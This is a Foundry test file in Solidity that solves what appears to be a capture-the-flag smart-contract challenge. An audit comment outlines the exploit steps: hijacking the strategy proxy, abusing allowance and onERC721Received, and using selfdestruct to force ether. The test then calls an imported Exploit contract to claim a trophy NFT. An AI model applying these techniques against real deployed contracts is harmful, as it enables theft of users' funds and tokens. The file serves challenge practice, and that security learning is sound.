// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {AnniversaryChallenge} from "../src/AnniversaryChallenge.sol";
import {SimpleStrategy} from "../src/SimpleStrategy.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

import {Exploit} from "../src/Exploit.sol";

// Rules:
// 1. Use Ethernet fork.
// 2. Use 20486120 block.
// 3. No deal() and vm.deal() allowed.
// 4. No setUp() amendmends allowed.
// 5. The exploit must be executed in single transaction.
// 6. Your task is to claim trophy and get Trophy NFT as player account.
contract AnniversaryChallengeTest is Test {
    address player;
    AnniversaryChallenge challenge;

    //Rules: No setUp changes are allowed.
    function setUp() public {
        player = vm.addr(42);
        vm.deal(player, 1 ether);

        address simpleStrategyImplementation = address(new SimpleStrategy());
        bytes memory data = abi.encodeCall(
            SimpleStrategy.initialize,
            address(challenge)
        );
        address proxy = address(
            new ERC1967Proxy(simpleStrategyImplementation, data)
        );
        SimpleStrategy simpleStrategy = SimpleStrategy(proxy);

        challenge = new AnniversaryChallenge(simpleStrategy);

        deal(simpleStrategy.usdcAddress(), address(challenge), 1e6);
    }

    function test_claimTrophy() public {
        vm.startPrank(player);
        //Execute exploit here.

        //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        /** @audit
        
            1. As proxy pointer can be changed to attacker contract -> deployFunds can be changed
            2. upon calling claimTrophy function -> deployFunds function gets triggered 
            3. as in attacker contract we passes this one without any LOC -> only increases the allowance
            4. Call claimTrophy function again with receiver as attacker contract -> catches error and triggers onERC721Received function
            5. In onERC721Received function -> selfdestruct the self function to send ether to challenge contract
            6. Transfer the NFT to player address from the attacker contract
         */
        //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        ///////////////////////////////////////////////// EXPLOIT ////////////////////////////////////////////////////////////////

        Exploit exploit = new Exploit(
            address(challenge),
            address(challenge.simpleStrategy())
        );
        address(exploit).call{value: 1 wei}("");
        exploit.attack();

        challenge.claimTrophy(player, 1);
        challenge.claimTrophy(address(exploit), 1e6);

        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        //No execution of exploit after this point.
        vm.stopPrank();
        assertEq(challenge.trophyNFT().ownerOf(1), player);
    }
}
